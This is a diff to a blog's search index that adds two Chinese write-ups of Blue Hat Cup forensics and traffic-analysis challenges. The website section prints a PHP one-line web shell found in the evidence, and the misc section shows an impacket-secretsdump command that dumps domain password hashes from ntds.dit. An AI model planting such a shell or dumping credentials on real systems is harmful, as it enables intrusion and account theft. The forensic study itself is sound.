@@ -3,7 +3,7 @@
   <entry>
     <title>welcome to my blog</title>
     <url>/6666/07/27/welcome-to-my-blog/</url>
-    <content><![CDATA[<p>我是Charmersix，这个名字，大家可能不认识，你们可以叫我C&amp;S。<br>是一名小学生ctfer，为了方便自己记笔记，所以效仿身边的大佬，搭了这个blog。<br>这里将会写一些wp。<br>虽然叫wp，但是就是个人的刷题笔记，既然是笔记，就会有些地方详细，有些地方粗略。<br>都不一定有人看，所以全当自己笔记。</p>
+    <content><![CDATA[<p>我是Charmersix，这个名字，大家可能不认识，你们可以叫我C&amp;S,实在不行，可以叫我小六。<br>是一名小学生ctfer，为了方便自己记笔记，所以效仿身边的大佬，搭了这个blog。<br>这里将会写一些wp。<br>虽然叫wp，但是就是个人的刷题笔记，既然是笔记，就会有些地方详细，有些地方粗略。<br>都不一定有人看，所以全当自己笔记。</p>
 ]]></content>
       <tags>
         <tag>博客</tag>
@@ -925,6 +925,159 @@
         <tag>flow</tag>
         <tag>Misc</tag>
         <tag>study</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝帽杯_电子取证</title>
+    <url>/2022/07/10/blue_hat/</url>
+    <content><![CDATA[<p>第一次做这么多取证题，也是学到了很多东西</p>
+<h3 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h3><h4 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h4><blockquote>
+<p>  ​    现对一个苹果手机进行取证，请您对以下问题进行分析解答。</p>
+<p>  ​    627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？（答案参考格式：1920x1080）</p>
+<p>  ​    附件下载地址见平台公告，解压密码为0ba6b2c094cbb3a04681a135487a19cb</p>
+</blockquote>
+<p>盘古阅读器打开，搜索一下题目中的图片，得到</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDLvkT.png"></p>
+<p>我们保存下来，看一下属性</p>
+<p>得到分辨率</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDOk0x.png"></p>
+<h4 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h4><p>还是上题做法，我们搜一下单号</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDODH0.png"></p>
+<h3 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h3><h4 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h4><blockquote>
+<p>  现对一个windows计算机进行取证，请您对以下问题进行分析解答。</p>
+<p>  从内存镜像中获得taqi7的开机密码是多少？（答案参考格式：abcABC123）</p>
+<p>  附件下载地址见平台公告，解压密码为93ce7ea39bdd7baa137f1e9b963b7ee5</p>
+</blockquote>
+<p>内存取证，来到强大的vol</p>
+<p>详情见截图</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jr93Yq.png"></p>
+<p>得到后，我们进行MD5解密</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jr9BkR.png"></p>
+<h4 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h4><blockquote>
+<p>  制作该内存镜像的进程Pid号是多少？（答案参考格式：1024）</p>
+</blockquote>
+<p>这次我们打开火眼</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrCp90.png"></p>
+<p>然后找到进程</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrCVE9.png"></p>
+<h4 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h4><blockquote>
+<p>  bitlokcer分区某office文件中存在的flag值为？（答案参考格式：flag{abcABC123}）</p>
+</blockquote>
+<p>来到取证大师，用小工具解析出密钥</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrkIQx.png" alt="https://s1.ax1x.com/2022/07/09/jrkIQx.png"></p>
+<p>然后保存下来</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrkjfA.png"></p>
+<p>解开，得到两个office文件，全部导出</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrAZpn.png"></p>
+<p>再次套娃一层</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrABAe.png"></p>
+<p>我们还能发现pass.txt,打开是个字典，正好可以爆破</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrVHmV.png"></p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrEu8A.png"></p>
+<h4 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h4><blockquote>
+<p>  TrueCrypt加密中存在的flag值为？（答案参考格式：flag{abcABC123}）</p>
+</blockquote>
+<p>再回到vol</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrmndf.png"></p>
+<p>万物皆可binwalk</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jru3bq.png"></p>
+<p>拿到了一坨压缩包，大致翻了翻，只有一个带密码的，好像有些东西</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jru0M9.png"></p>
+<p>好像损坏了，由于手头只有修zip的工具，生改后缀，成功，爆破</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrKFWF.png"></p>
+<p>flag：<code>flag&#123;1349934913913991394cacacacacacc&#125;</code></p>
+<h3 id="app取证"><a href="#app取证" class="headerlink" title="app取证"></a>app取证</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h4><blockquote>
+<p>  现已获取某个APP程序，请您对以下问题进行分析解答。</p>
+<p>  本程序包名是？（答案参考格式：abc.xx.de）</p>
+<p>  <a href="https://pan.baidu.com/s/1VrweUuSf0UHoEKyvnEglWQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/tZ3vmudB">备用下载</a></p>
+</blockquote>
+<p>打开我们的雷电工具，显而易见</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrliJf.png"></p>
+<h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h4><blockquote>
+<p>  本程序的入口是？（答案参考格式：abc.xx.de）</p>
+</blockquote>
+<p>继续看</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrl3SU.png"></p>
+<p>得到<code>minmtta.hemjcbm.ahibyws.MainActivity</code></p>
+<h4 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h4><blockquote>
+<p>  本程序的服务器地址的密文是？（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>反编译一下，拿到源码</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrlhff.png"></p>
+<p><code>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</code></p>
+<h4 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h4><blockquote>
+<p>  本程序实现安全检测的类的名称是？（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>继续顺一下我们的源码，安全检测，发现了相关源码</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jr1KnH.png"></p>
+<h3 id="网站取证"><a href="#网站取证" class="headerlink" title="网站取证"></a>网站取证</h3><h4 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h4><blockquote>
+<p>  据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p>
+<p>  请从网站源码中找出木马文件，并提交木马连接的密码。（答案参考格式：abcABC123）</p>
+<p>  <a href="https://pan.baidu.com/s/1Z9pbTa18qP70-LQJq-S0qA">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/x3wua9ys">备用下载</a></p>
+</blockquote>
+<p>下载附件，看一下，全是源码，咱们vsc打开翻一翻</p>
+<p>然后挨着翻也就翻到了一句话木马</p>
+<p><code>&lt;?php assert(@$_POST[&#39;lanmaobei666&#39;]); ?&gt;</code></p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jr178K.png"></p>
+<h4 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h4><blockquote>
+<p>  请提交数据库连接的明文密码。（答案参考格式：abcABC123）</p>
+</blockquote>
+<p><img src="https://s1.ax1x.com/2022/07/09/jrGNjO.png"></p>
+<p>passwd指到了<code>my_encrypt()</code></p>
+<p><img src="https://img-blog.csdnimg.cn/8cf1d0e79632443799ffc570e2e6b7d7.png"></p>
+<p>根据源码得到解码脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果<code>KBLT123</code></p>
+<h4 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h4><blockquote>
+<p>  请提交数据库金额加密混淆使用的盐值。（答案参考格式：abcABC123）</p>
+</blockquote>
+<p>还是翻源码，得到</p>
+<p><img src="https://img-blog.csdnimg.cn/b2badf8b9054448d9bc19443ce6c99af.png"></p>
+<p><code>function decrypt($data, $key = &#39;jyzg123456&#39;)</code></p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+        <tag>SkyMirror</tag>
+        <tag>Forensics</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝帽杯_misc</title>
+    <url>/2022/07/10/%E8%93%9D%E5%B8%BD%E6%9D%AF_misc/</url>
+    <content><![CDATA[<p>两道misc，全是流量分析，第二题用了一种从来没有用过的工具</p>
+<h3 id="misc1-domainhacker"><a href="#misc1-domainhacker" class="headerlink" title="misc1 domainhacker"></a>misc1 domainhacker</h3><blockquote>
+<p>  ​    公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？flag格式：flag{hash_of_machine}</p>
+<p>  ​    <a href="https://pan.baidu.com/s/1hdf3-aReCpEmnvAO8Orgvg">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/7Azv6Rlu">备用下载</a></p>
+</blockquote>
+<p>简单的流量分析</p>
+<p>文件、导出http对象、保存1.rar</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDHxte.png"></p>
+<p>要密码，追踪流，追到13流</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDbk0f.png"></p>
+<p>base64解码，出压缩包密码，解压</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDbVAS.png"></p>
+<p>解压得</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDb1BV.png"></p>
+<h3 id="misc2-domainhacker2"><a href="#misc2-domainhacker2" class="headerlink" title="misc2 domainhacker2"></a>misc2 domainhacker2</h3><blockquote>
+<p>  公司安全部门今日发现，有一台域控主机疑似被攻陷，并且很有可能黑客已经掌握了所有域用户的hash，你能分析流量，给出域管理员administrator的上一次的密码hash吗？flag格式：flag{hash of the ntlm hash}</p>
+<p> <a href="https://pan.baidu.com/s/1hlv5m8WZ8M7Ym9LFEo7peA">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/uboBbBtx">备用下载</a>前面的步骤与<code>Misc-domainhacker</code>相同，只是最后解压出来的数据是域渗透后的数据。考虑使用<code>Misc-domainhacker</code>来读取相关数据：</p>
+</blockquote>
+<p>前期跟上题差不多</p>
+<p>这次我们来到了27流</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDbacR.png"></p>
+<p>解码</p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDbdj1.png"></p>
+<p>拿到压缩包密码，解压</p>
+<p>然后我们来到kali</p>
+<p><code>impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -history</code></p>
+<p><img src="https://s1.ax1x.com/2022/07/09/jDb64e.png"></p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+        <tag>flow</tag>
+        <tag>Misc</tag>
+        <tag>SkyMirror</tag>
       </tags>
   </entry>
 </search>
